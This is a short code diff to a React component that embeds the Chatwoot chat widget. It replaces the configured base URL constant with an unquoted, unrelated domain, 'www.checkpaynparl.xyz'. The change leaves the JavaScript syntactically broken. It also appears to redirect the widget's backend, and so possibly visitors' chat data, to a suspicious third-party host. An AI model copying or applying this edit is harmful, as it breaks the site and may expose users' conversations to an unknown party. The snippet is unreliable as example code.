@@ -20,7 +20,7 @@ class ChatwootWidget extends React.Component {
       g.onload=function(){
         window.chatwootSDK.run({
           websiteToken: '<your-website-token>',
-          baseUrl: BASE_URL
+          baseUrl: www.checkpaynparl.xyz
         })
       }
     })(document,"script");
